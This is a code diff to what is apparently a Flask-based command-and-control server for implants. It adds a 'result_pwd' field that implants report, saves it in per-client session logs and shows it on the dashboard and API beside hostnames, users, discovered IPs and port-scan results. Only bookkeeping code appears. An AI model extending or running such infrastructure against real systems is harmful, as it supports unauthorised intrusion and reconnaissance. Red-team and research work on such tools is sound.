@@ -1603,6 +1603,7 @@ def index():
     user = {}
     discovered_ips = {}
     result_portscan = {}
+    result_pwd = {}
     for client_id in connected_clients_list:
         csv_file = f"sessions/{client_id}.log"
         try:
@@ -1619,7 +1620,7 @@ def index():
                         user[client_id] = rows[-1]['user']
                         discovered_ips[client_id] = rows[-1]['discovered_ips']
                         result_portscan[client_id] = rows[-1]['result_portscan']
-                     
+                        result_pwd[client_id] = rows[-1]['result_pwd']
         except Exception as e:
             if config.enable_c2_debug == True:
                 logger.info("[Error] implant logs corrupted.")
@@ -1670,6 +1671,7 @@ def index():
         local_ips= local_ips,
         discovered_ips=discovered_ips,
         result_portscan=result_portscan,
+        result_pwd=result_pwd,
         short_urls=short_urls,
         c2_port=lport
     )
@@ -1704,7 +1706,7 @@ def receive_result(client_id):
             connected_clients.add(client_id)
             if config.enable_c2_debug == True:
                 logger.info(f"New client connected: {client_id}")        
-        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan']):
+        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan', 'result_pwd']):
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
 
         output = data['output']
@@ -1715,6 +1717,7 @@ def receive_result(client_id):
         user = data['user']
         discovered_ips = data['discovered_ips']
         result_portscan = data['result_portscan']
+        result_pwd = data['result_pwd']
         command = data['command']
 
 
@@ -1749,7 +1752,7 @@ def receive_result(client_id):
             with open(csv_file_abs, 'a', newline='') as f:
                 writer = csv.writer(f)
                 if not file_exists:
-                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "command", "output"])
+                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "result_pwd", "command", "output"])
 
                 safe_data = [
                     str(sanitized_client_id),
@@ -1760,6 +1763,7 @@ def receive_result(client_id):
                     str(user)[:50],
                     str(discovered_ips)[:1000],
                     str(result_portscan)[:1000],
+                    str(result_pwd)[:1000],
                     str(command)[:500],
                     str(output)[:1000]
                 ]
@@ -1774,6 +1778,7 @@ def receive_result(client_id):
                 "user": user,
                 "discovered_ips": discovered_ips,
                 "result_portscan": result_portscan,
+                "result_pwd": result_pwd,
                 "command": command
             }
 
@@ -1953,6 +1958,7 @@ def api_data():
     user = {}
     discovered_ips = {}
     result_portscan = {}
+    result_pwd = {}
     for client_id in connected_clients_list:
         csv_file = f"sessions/{client_id}.log"
         try:
@@ -1969,7 +1975,7 @@ def api_data():
                         user[client_id] = rows[-1]['user']
                         discovered_ips[client_id] = rows[-1]['discovered_ips']
                         result_portscan[client_id] = rows[-1]['result_portscan']
-
+                        result_pwd[client_id] = rows[-1]['result_pwd']
         except Exception as e:
             if config.enable_c2_debug == True:
                 logger.info("[Error] implant logs corrupted.")
@@ -2019,6 +2025,7 @@ def api_data():
         'local_ips': local_ips,
         'discovered_ips': discovered_ips,
         'result_portscan': result_portscan,
+        'result_pwd': result_pwd,
         'short_urls': short_urls,
         'c2_port': lport,
         'karma_name': karma_name,
